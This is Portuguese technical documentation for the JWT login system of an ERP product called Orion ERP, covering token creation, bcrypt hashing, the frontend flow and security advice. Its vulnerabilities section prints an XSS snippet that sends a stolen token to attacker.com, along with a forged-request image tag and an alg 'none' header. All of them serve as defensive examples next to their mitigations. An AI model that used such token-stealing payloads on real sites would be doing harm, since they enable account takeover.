# Autenticação JWT no Orion ERP

> **Importante**: Esta documentação descreve o sistema de autenticação JWT REALMENTE implementado no Orion ERP, baseado no código em produção.

## Índice

1. [Visão Geral](#1-visão-geral)
2. [Tecnologias Utilizadas](#2-tecnologias-utilizadas)
3. [Fluxo de Autenticação](#3-fluxo-de-autenticação)
4. [Estrutura dos Tokens](#4-estrutura-dos-tokens)
5. [Implementação](#5-implementação)
6. [Segurança](#6-segurança)
7. [Tratamento de Erros](#7-tratamento-de-erros)
8. [Melhores Práticas](#8-melhores-práticas)
9. [Troubleshooting](#9-troubleshooting)

---

## 1. Visão Geral

### O que é JWT?

JWT (JSON Web Token) é um padrão aberto (RFC 7519) para transmissão segura de informações entre partes como um objeto JSON. No Orion ERP, usamos JWT para:

- **Autenticação stateless**: Não requer sessões no servidor
- **Multi-tenancy**: `workspace_id` embutido no token
- **Performance**: Validação rápida sem consulta ao banco
- **Escalabilidade**: Suporta múltiplos servidores sem estado compartilhado

### Arquitetura Stateless

```
┌──────────────┐                ┌──────────────┐
│   Cliente    │                │   Servidor   │
│  (Frontend)  │                │  (Backend)   │
└──────┬───────┘                └──────┬───────┘
       │                               │
       │ 1. POST /auth/token           │
       │    {email, password}          │
       │──────────────────────────────>│
       │                               │
       │                        2. Valida credenciais
       │                           Busca user no DB
       │                        3. Gera JWT (assina)
       │                               │
       │ 4. {access_token, refresh}    │
       │<──────────────────────────────│
       │                               │
  5. Armazena tokens                   │
     no localStorage                   │
       │                               │
       │ 6. GET /products/             │
       │    Authorization: Bearer JWT  │
       │──────────────────────────────>│
       │                               │
       │                        7. Decodifica JWT
       │                           Valida assinatura
       │                           Extrai user_id
       │                           (SEM consulta DB)
       │                               │
       │ 8. Resposta com dados         │
       │<──────────────────────────────│
       │                               │
```

**Vantagens do Stateless:**
- ✅ Servidor não precisa armazenar sessões
- ✅ Escalabilidade horizontal simples
- ✅ Performance (menos I/O no banco)
- ✅ Suporta microserviços e APIs

---

## 2. Tecnologias Utilizadas

### Bibliotecas

**Backend (Python/FastAPI):**
```python
# requirements.txt
python-jose[cryptography]==3.3.0  # JWT encoding/decoding
passlib[bcrypt]==1.7.4            # Password hashing
python-dotenv==1.0.0              # Environment variables
```

**Localização:** [backend/app/core/security.py](backend/app/core/security.py)

### Algoritmos

#### HMAC-SHA256 (HS256)
```python
ALGORITHM = "HS256"
```

- **Tipo**: Symmetric key algorithm
- **Chave**: SECRET_KEY compartilhada
- **Uso**: Assinatura e verificação de tokens
- **Performance**: Rápido (ideal para APIs)

**Por que HS256?**
- ✅ Mais rápido que algoritmos assimétricos (RS256)
- ✅ Suficiente para autenticação server-to-client
- ✅ Amplamente suportado
- ❌ Requer SECRET_KEY protegida

#### Bcrypt para Senhas
```python
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
```

- **Tipo**: Adaptive hash function
- **Rounds**: 12 (padrão, ajustável)
- **Salt**: Automático (único por senha)
- **Resistente a**: Rainbow tables, brute force

**Características:**
- Trunca senhas em 72 bytes (limitação do bcrypt)
- Cost factor aumentável ao longo do tempo
- Tempo de hash intencional (~100-200ms)

---

## 3. Fluxo de Autenticação

### Passo 1: Registro de Usuário

```http
POST /api/v1/users/
Content-Type: application/json

{
  "email": "user@empresa.com",
  "password": "senha_segura_123",
  "name": "João Silva",
  "company_name": "Empresa LTDA",
  "cnpj": "12345678000190"
}
```

**Processo:**
1. Valida formato de email
2. Verifica se email já existe
3. Gera hash bcrypt da senha
4. Cria workspace automaticamente
5. Cria usuário vinculado ao workspace
6. Retorna usuário criado

**Código:**
```python
# Hash da senha ANTES de armazenar
hashed_password = get_password_hash(password)

user = User(
    email=email,
    hashed_password=hashed_password,  # Nunca armazena senha plain
    workspace_id=workspace.id,
    role="admin"  # Primeiro usuário é admin do workspace
)
```

---

### Passo 2: Login

```http
POST /api/v1/auth/token
Content-Type: application/json

{
  "email": "user@empresa.com",
  "password": "senha_segura_123"
}
```

**Processo (detalhado):**

Localização: [backend/app/api/api_v1/endpoints/auth.py](backend/app/api/api_v1/endpoints/auth.py:12-59)

```python
@router.post("/token", response_model=Token)
async def login(login_data: UserLogin, db: Session = Depends(get_db)):
    # 1. Busca usuário por email
    user = db.query(User).filter(User.email == login_data.email).first()

    # 2. Verifica existência e senha
    if not user or not verify_password(login_data.password, user.hashed_password):
        raise HTTPException(
            status_code=401,
            detail="Incorrect email or password"
        )

    # 3. Verifica se usuário está ativo
    if not user.active:
        raise HTTPException(
            status_code=403,
            detail="Inactive user"
        )

    # 4. Prepara dados para o token
    token_data = {
        "user_id": user.id,
        "workspace_id": user.workspace_id,  # ← Multi-tenancy
        "email": user.email
    }

    # 5. Cria access token (30 min) e refresh token (7 dias)
    access_token = create_access_token(data=token_data)
    refresh_token = create_refresh_token(data=token_data)

    # 6. Retorna ambos os tokens
    return {
        "access_token": access_token,
        "refresh_token": refresh_token,
        "token_type": "bearer"
    }
```

**Resposta:**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMCwid29ya3NwYWNlX2lkIjo1LCJlbWFpbCI6InVzZXJAZW1wcmVzYS5jb20iLCJleHAiOjE3MzcwNDU2MDAsInR5cGUiOiJhY2Nlc3MifQ.signature",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMCwid29ya3NwYWNlX2lkIjo1LCJlbWFpbCI6InVzZXJAZW1wcmVzYS5jb20iLCJleHAiOjE3Mzc2NTA0MDAsInR5cGUiOiJyZWZyZXNoIn0.signature",
  "token_type": "bearer"
}
```

---

### Passo 3: Armazenamento no Cliente

**Frontend (Next.js):**
```typescript
// Login function
const handleLogin = async (email: string, password: string) => {
  const response = await fetch('/api/v1/auth/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });

  const data = await response.json();

  // Armazena no localStorage
  localStorage.setItem('access_token', data.access_token);
  localStorage.setItem('refresh_token', data.refresh_token);

  // Opcional: também busca dados do usuário
  const userResponse = await fetch('/api/v1/auth/me', {
    headers: { 'Authorization': `Bearer ${data.access_token}` }
  });
  const userData = await userResponse.json();
  localStorage.setItem('user', JSON.stringify(userData));

  // Redireciona para dashboard
  router.push('/admin/dashboard');
};
```

**Segurança no Frontend:**
- ⚠️ `localStorage` é vulnerável a XSS
- ✅ Alternativa mais segura: `httpOnly` cookies
- ✅ Sempre use HTTPS em produção
- ✅ Implemente Content Security Policy (CSP)

---

### Passo 4: Requisições Autenticadas

```http
GET /api/v1/products/
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Frontend:**
```typescript
// Interceptor Axios (exemplo)
axios.interceptors.request.use(
  (config) => {
    const token = localStorage.getItem('access_token');
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Ou manualmente
const response = await fetch('/api/v1/products/', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('access_token')}`
  }
});
```

**Backend (Middleware):**

Localização: [backend/app/core/deps.py](backend/app/core/deps.py:14-70)

```python
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials

security = HTTPBearer()

def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(security),
    db: Session = Depends(get_db)
) -> User:
    """
    Valida JWT e retorna usuário autenticado.
    """
    # 1. Extrai token do header Authorization
    token = credentials.credentials

    # 2. Decodifica e valida assinatura
    payload = decode_token(token)
    if payload is None:
        raise HTTPException(status_code=401, detail="Invalid token")

    # 3. Valida tipo de token (deve ser "access")
    if payload.get("type") != "access":
        raise HTTPException(status_code=401, detail="Invalid token type")

    # 4. Extrai user_id do payload
    user_id = payload.get("user_id")
    if user_id is None:
        raise HTTPException(status_code=401, detail="Invalid token")

    # 5. Busca usuário no banco
    user = db.query(User).filter(User.id == user_id).first()
    if user is None:
        raise HTTPException(status_code=401, detail="User not found")

    # 6. Valida se usuário está ativo
    if not user.active:
        raise HTTPException(status_code=403, detail="Inactive user")

    return user
```

---

### Passo 5: Renovação de Token (Refresh)

**Por que renovar?**
- Access token expira em 30 minutos (segurança)
- Refresh token expira em 7 dias (conveniência)
- Evita forçar login a cada 30 minutos

**Implementação (não implementada ainda - planejada):**

```python
# Endpoint futuro
@router.post("/refresh", response_model=Token)
async def refresh_token(
    refresh_token: str,
    db: Session = Depends(get_db)
):
    # Decodifica refresh token
    payload = decode_token(refresh_token)

    if not payload or payload.get("type") != "refresh":
        raise HTTPException(status_code=401, detail="Invalid refresh token")

    # Gera novo access token (mantém refresh token)
    token_data = {
        "user_id": payload["user_id"],
        "workspace_id": payload["workspace_id"],
        "email": payload["email"]
    }

    new_access_token = create_access_token(data=token_data)

    return {
        "access_token": new_access_token,
        "refresh_token": refresh_token,  # Mantém o mesmo
        "token_type": "bearer"
    }
```

**Frontend (interceptor de 401):**
```typescript
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // Se 401 e não tentou renovar ainda
    if (error.response.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      const refreshToken = localStorage.getItem('refresh_token');

      try {
        // Tenta renovar token
        const response = await axios.post('/api/v1/auth/refresh', {
          refresh_token: refreshToken
        });

        const { access_token } = response.data;
        localStorage.setItem('access_token', access_token);

        // Retenta requisição original com novo token
        originalRequest.headers.Authorization = `Bearer ${access_token}`;
        return axios(originalRequest);
      } catch (refreshError) {
        // Se falhar, faz logout
        localStorage.clear();
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);
```

---

### Passo 6: Logout

```http
POST /api/v1/auth/logout
Authorization: Bearer {token}
```

**Backend:**

Localização: [backend/app/api/api_v1/endpoints/auth.py](backend/app/api/api_v1/endpoints/auth.py:62-69)

```python
@router.post("/logout")
async def logout():
    """
    Logout endpoint.
    Em autenticação JWT, logout é feito no cliente removendo tokens.
    Este endpoint pode ser usado para logging ou blacklist futura.
    """
    return {"message": "Successfully logged out"}
```

**Frontend:**
```typescript
const handleLogout = () => {
  // Remove tokens
  localStorage.removeItem('access_token');
  localStorage.removeItem('refresh_token');
  localStorage.removeItem('user');

  // Redireciona para login
  router.push('/login');
};
```

**Nota:** Logout em JWT é principalmente client-side. Para invalidar tokens server-side, seria necessário implementar **token blacklist** (Redis).

---

## 4. Estrutura dos Tokens

### Access Token

**Estrutura JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  ← Header (Base64)
.
eyJ1c2VyX2lkIjoxMCwid29ya3NwYWNlX2lkIjo1LCJlbWFpbCI6InVzZXJAZW1wcmVzYS5jb20iLCJleHAiOjE3MzcwNDU2MDAsInR5cGUiOiJhY2Nlc3MifQ  ← Payload (Base64)
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature (HMAC-SHA256)
```

**Header (decodificado):**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload (decodificado):**
```json
{
  "user_id": 10,
  "workspace_id": 5,
  "email": "user@empresa.com",
  "exp": 1737045600,
  "type": "access"
}
```

**Claims:**
- `user_id`: ID do usuário (para buscar no banco)
- `workspace_id`: Workspace do usuário (multi-tenancy)
- `email`: Email do usuário (informativo)
- `exp`: Timestamp de expiração (Unix epoch)
- `type`: Tipo de token ("access" ou "refresh")

**Signature:**
```python
# Gerada com
signature = HMAC-SHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    SECRET_KEY
)
```

---

### Refresh Token

**Diferenças do Access Token:**
- `type`: "refresh"
- `exp`: 7 dias (604800 segundos)
- Payload idêntico, apenas expiração diferente

**Uso:**
- Armazenado de forma mais segura (httpOnly cookie idealmente)
- Usado apenas no endpoint `/auth/refresh`
- Não usado em requisições normais

---

### Configuração de Expiração

Localização: [backend/app/core/security.py](backend/app/core/security.py:14-17)

```python
ACCESS_TOKEN_EXPIRE_MINUTES = int(os.getenv("ACCESS_TOKEN_EXPIRE_MINUTES", "30"))
REFRESH_TOKEN_EXPIRE_DAYS = int(os.getenv("REFRESH_TOKEN_EXPIRE_DAYS", "7"))
```

**Arquivo `.env`:**
```env
ACCESS_TOKEN_EXPIRE_MINUTES=30
REFRESH_TOKEN_EXPIRE_DAYS=7
```

**Recomendações por ambiente:**
- **Desenvolvimento**: 30 min / 7 dias (atual)
- **Staging**: 15 min / 3 dias
- **Produção**: 10 min / 1 dia (mais seguro)
- **Banking/Finance**: 5 min / 8 horas

---

## 5. Implementação

### Password Hashing

Localização: [backend/app/core/security.py](backend/app/core/security.py:38-52)

```python
def get_password_hash(password: str) -> str:
    """
    Hash a password using bcrypt.
    Truncates password to 72 bytes (bcrypt limitation).
    """
    # Trunca em 72 bytes
    password_bytes = password.encode('utf-8')[:72]
    password_truncated = password_bytes.decode('utf-8', errors='ignore')

    return pwd_context.hash(password_truncated)
```

**Exemplo:**
```python
>>> password = "minha_senha_super_segura_123"
>>> hashed = get_password_hash(password)
>>> print(hashed)
$2b$12$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36WQoeG6Lruj3vjPGga31lW
```

**Anatomia do hash bcrypt:**
```
$2b$12$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36WQoeG6Lruj3vjPGga31lW
 │  │  │                                   │
 │  │  │                                   └─ Hash (31 chars)
 │  │  └─ Salt (22 chars)
 │  └─ Cost factor (12 = 2^12 = 4096 rounds)
 └─ Versão do bcrypt
```

---

### Password Verification

Localização: [backend/app/core/security.py](backend/app/core/security.py:20-35)

```python
def verify_password(plain_password: str, hashed_password: str) -> bool:
    """
    Verify a plain password against a hashed password.
    """
    # Trunca em 72 bytes (mesma lógica do hash)
    password_bytes = plain_password.encode('utf-8')[:72]
    password_truncated = password_bytes.decode('utf-8', errors='ignore')

    return pwd_context.verify(password_truncated, hashed_password)
```

**Uso:**
```python
>>> password = "senha123"
>>> hashed = "$2b$12$..."
>>> verify_password(password, hashed)
True
>>> verify_password("senha_errada", hashed)
False
```

**Performance:**
- ~100-200ms por verificação (intencional)
- Previne brute force attacks
- Cost factor ajustável conforme hardware evolui

---

### Token Creation

Localização: [backend/app/core/security.py](backend/app/core/security.py:55-95)

```python
def create_access_token(data: Dict[str, Any], expires_delta: Optional[timedelta] = None) -> str:
    """
    Create a JWT access token.
    """
    to_encode = data.copy()

    # Calcula expiração
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)

    # Adiciona claims obrigatórios
    to_encode.update({
        "exp": expire,
        "type": "access"
    })

    # Codifica e assina
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

    return encoded_jwt


def create_refresh_token(data: Dict[str, Any]) -> str:
    """
    Create a JWT refresh token.
    """
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)

    to_encode.update({
        "exp": expire,
        "type": "refresh"
    })

    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

    return encoded_jwt
```

---

### Token Decoding

Localização: [backend/app/core/security.py](backend/app/core/security.py:98-112)

```python
def decode_token(token: str) -> Optional[Dict[str, Any]]:
    """
    Decode and verify a JWT token.
    Returns None if invalid or expired.
    """
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except JWTError:
        # Token inválido, expirado ou assinatura incorreta
        return None
```

**Validações automáticas:**
- ✅ Assinatura (verifica SECRET_KEY)
- ✅ Expiração (valida `exp` claim)
- ✅ Formato JSON válido
- ✅ Algoritmo correto (HS256)

---

## 6. Segurança

### Proteção da SECRET_KEY

**Crítico:** A SECRET_KEY é a base de toda a segurança JWT.

**Geração segura:**
```python
import secrets

# Gera chave criptograficamente segura (256 bits)
secret_key = secrets.token_urlsafe(32)
print(secret_key)
# Exemplo: 'Zr3yJ8xK9pLmQ2wN5vT7uA1sD4fG6hJ8kM0nB3cV5xZ'
```

**Armazenamento:**
```env
# .env (NUNCA commitar no git!)
SECRET_KEY=Zr3yJ8xK9pLmQ2wN5vT7uA1sD4fG6hJ8kM0nB3cV5xZ
```

**`.gitignore`:**
```
.env
.env.*
!.env.example
```

**Produção:**
- ✅ Usar secret manager (AWS Secrets Manager, Azure Key Vault)
- ✅ Rotacionar periodicamente (a cada 90 dias)
- ✅ Diferentes keys por ambiente (dev, staging, prod)
- ❌ NUNCA commitar no código

---

### HTTPS Only

**Em produção, sempre use HTTPS:**
```python
# main.py
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware

app.add_middleware(HTTPSRedirectMiddleware)
```

**Por quê?**
- JWT em HTTP é vulnerável a man-in-the-middle
- Token capturado = acesso completo à conta
- HTTPS criptografa toda a comunicação

---

### Vulnerabilidades Comuns

#### 1. XSS (Cross-Site Scripting)

**Ataque:**
```javascript
// Código malicioso injetado
<script>
  const token = localStorage.getItem('access_token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**Mitigação:**
```typescript
// Usar httpOnly cookies (melhor opção)
// Backend define cookie:
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,  // JavaScript não pode acessar
    secure=True,     // Apenas HTTPS
    samesite="lax"   // Proteção CSRF
)

// Ou Content Security Policy (CSP)
app.add_middleware(
    TrustedHostMiddleware,
    allowed_hosts=["orion-erp.com"]
)
```

---

#### 2. CSRF (Cross-Site Request Forgery)

**Ataque:**
```html
<!-- Site malicioso -->
<img src="https://orion-erp.com/api/v1/products/123/delete" />
```

**Mitigação:**
- ✅ Tokens JWT em Authorization header (não em cookies automáticos)
- ✅ Validar `Origin` e `Referer` headers
- ✅ Usar tokens CSRF adicionais se usar cookies

---

#### 3. JWT Injection

**Ataque:**
```python
# Tentativa de injetar claims
token_data = {
    "user_id": 10,
    "role": "super_admin",  # ← Tentativa de elevar privilégios
    "workspace_id": 1
}
```

**Mitigação:**
```python
# NUNCA aceite claims sensíveis do usuário
# Sempre busque do banco de dados

user = db.query(User).filter(User.id == user_id).first()
role = user.role  # ← Do banco, não do token
workspace_id = user.workspace_id  # ← Do banco
```

---

#### 4. Algorithm Confusion Attack

**Ataque:**
```python
# Atacante troca HS256 para "none"
header = {
    "alg": "none",  # ← Sem assinatura!
    "typ": "JWT"
}
```

**Mitigação:**
```python
# SEMPRE especifique algoritmos permitidos
jwt.decode(token, SECRET_KEY, algorithms=["HS256"])  # ← Lista explícita

# NÃO use:
jwt.decode(token, SECRET_KEY)  # ← Aceita qualquer algoritmo
```

---

### Bcrypt Limitations

**72 bytes limit:**
```python
# Senhas maiores que 72 bytes são truncadas
password = "a" * 100  # 100 caracteres
hashed = get_password_hash(password)

# Apenas os primeiros 72 bytes são hasheados
verify_password("a" * 72, hashed)  # True
verify_password("a" * 100, hashed)  # True (truncado)
```

**Recomendações:**
- Documentar limite para usuários
- Validar tamanho no frontend
- Considerar migração para Argon2 no futuro

---

## 7. Tratamento de Erros

### Erros de Autenticação

**401 Unauthorized:**
```python
raise HTTPException(
    status_code=status.HTTP_401_UNAUTHORIZED,
    detail="Incorrect email or password",
    headers={"WWW-Authenticate": "Bearer"}
)
```

**Casos:**
- Email não encontrado
- Senha incorreta
- Token inválido
- Token expirado
- Token com assinatura incorreta

---

**403 Forbidden:**
```python
raise HTTPException(
    status_code=status.HTTP_403_FORBIDDEN,
    detail="Inactive user"
)
```

**Casos:**
- Usuário desativado
- Permissões insuficientes
- Tentativa de acesso a recurso de outro workspace

---

### Mensagens de Erro

**❌ Ruim (revela informações):**
```python
# NÃO fazer isso
if not user:
    raise HTTPException(detail="User not found")
if not verify_password(...):
    raise HTTPException(detail="Wrong password")
```

**✅ Bom (genérico):**
```python
# Fazer isso
if not user or not verify_password(...):
    raise HTTPException(detail="Incorrect email or password")
```

**Por quê?**
- Previne user enumeration attacks
- Atacante não sabe se email existe
- Mais seguro

---

## 8. Melhores Práticas

### Para Desenvolvedores

#### ✅ DO: Use dependências FastAPI
```python
@router.get("/products/")
def get_products(
    current_user: User = Depends(get_current_user),  # ← Automático
    db: Session = Depends(get_db)
):
    # ...
```

#### ❌ DON'T: Não valide manualmente
```python
# RUIM
@router.get("/products/")
def get_products(authorization: str = Header(...)):
    token = authorization.replace("Bearer ", "")
    user = decode_token(token)  # Sem validação completa
```

---

#### ✅ DO: Sempre verifique user.active
```python
if not user.active:
    raise HTTPException(status_code=403, detail="Inactive user")
```

#### ❌ DON'T: Não assuma que usuário está ativo
```python
# RUIM - usuário pode estar desativado
return user
```

---

#### ✅ DO: Use HTTPS em produção
```python
# Configuração Nginx
server {
    listen 443 ssl;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
}
```

#### ❌ DON'T: Nunca use JWT em HTTP
```python
# MUITO PERIGOSO
http://orion-erp.com/api/v1/products/
```

---

### Checklist de Segurança

- [ ] SECRET_KEY criptograficamente segura (32+ bytes)?
- [ ] SECRET_KEY diferente em cada ambiente?
- [ ] SECRET_KEY NUNCA commitada no git?
- [ ] HTTPS habilitado em produção?
- [ ] Tokens armazenados de forma segura (httpOnly cookies)?
- [ ] Refresh token implementado?
- [ ] Logs de tentativas de login falhadas?
- [ ] Rate limiting em `/auth/token`?
- [ ] Validação de `user.active` em todos os endpoints?
- [ ] Content Security Policy (CSP) configurado?

---

## 9. Troubleshooting

### Token inválido constantemente

**Sintoma:**
```json
{
  "detail": "Could not validate credentials"
}
```

**Causas possíveis:**
1. SECRET_KEY diferente entre deploy e local
2. Token expirado (exp claim ultrapassado)
3. Token modificado manualmente
4. Algoritmo incorreto

**Debug:**
```python
import jwt

token = "eyJhbGciOiJIUzI1NiIs..."

# Decodifica SEM validar (apenas para debug)
payload = jwt.decode(token, options={"verify_signature": False})
print(payload)

# Verifica expiração
import time
if payload['exp'] < time.time():
    print("Token expirado!")
```

---

### Usuário não autenticado após login

**Sintoma:**
Frontend não consegue acessar recursos protegidos.

**Checklist:**
1. Token foi armazenado no localStorage?
```javascript
console.log(localStorage.getItem('access_token'));
```

2. Header Authorization está correto?
```javascript
// Deve ser exatamente assim:
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

// NÃO assim:
Authorization: eyJhbGciOiJIUzI1NiIs...  // Falta "Bearer"
Authorization: Bearer: eyJhbGciOiJIUzI1NiIs...  // "Bearer:" com dois pontos
```

3. CORS configurado no backend?
```python
# config.py
BACKEND_CORS_ORIGINS = "http://localhost:3000,http://localhost:3001"
```

---

### Senha não valida (mas está correta)

**Sintoma:**
```python
verify_password("senha123", hashed)  # False (mas deveria ser True)
```

**Causas:**
1. Hash foi gerado com biblioteca diferente
2. Salt perdido/corrompido
3. Encoding UTF-8 incorreto

**Solução:**
```python
# Re-gerar hash da senha
new_hashed = get_password_hash("senha123")
user.hashed_password = new_hashed
db.commit()
```

---

## Recursos Adicionais

### Arquivos Relevantes
- [backend/app/core/security.py](backend/app/core/security.py) - Funções de autenticação
- [backend/app/core/deps.py](backend/app/core/deps.py) - Dependencies FastAPI
- [backend/app/api/api_v1/endpoints/auth.py](backend/app/api/api_v1/endpoints/auth.py) - Endpoints de auth
- [backend/app/core/config.py](backend/app/core/config.py) - Configurações

### Referências Externas
- [JWT.io](https://jwt.io/) - Debugger de JWT
- [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519) - Especificação JWT
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [passlib Documentation](https://passlib.readthedocs.io/)
- [python-jose Documentation](https://python-jose.readthedocs.io/)

---

**Versão:** 1.0
**Última atualização:** 2025-01-15
**Autor:** Documentação Orion ERP
